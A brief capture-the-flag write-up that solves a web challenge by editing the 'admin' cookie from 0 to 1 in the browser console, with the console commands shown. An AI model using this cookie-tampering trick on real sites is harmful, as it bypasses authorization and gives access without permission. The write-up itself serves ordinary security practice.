# authorized persons only

## Description
Authorized persons can get flag here[http://hack.bckdr.in/CKK/index.php]
Created by: Vishrut Kumar Mishra
No. of Correct Submissions: 1383

## Solution

Just set the admin field in the cookie to 1. You can do it via the browser console.

```
document.cookie
"admin=0; PHPSESSID=a870qm80ls7r5lhnoqfjohbvc2"
document.cookie="admin=1; PHPSESSID=a870qm80ls7r5lhnoqfjohbvc2"
"admin=1; PHPSESSID=a870qm80ls7r5lhnoqfjohbvc2"
```

Refresh the site and get the flag.
